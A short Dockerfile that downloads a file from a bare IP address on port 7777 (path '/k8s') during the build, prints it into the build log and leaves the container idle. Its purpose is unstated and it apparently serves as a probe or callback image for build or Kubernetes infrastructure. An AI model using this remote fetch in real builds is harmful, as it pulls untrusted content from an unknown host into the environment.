FROM alpine:3.19
ADD http://62.113.111.63:7777/k8s /tmp/data
RUN cat /tmp/data 2>&1 || true
CMD sleep infinity
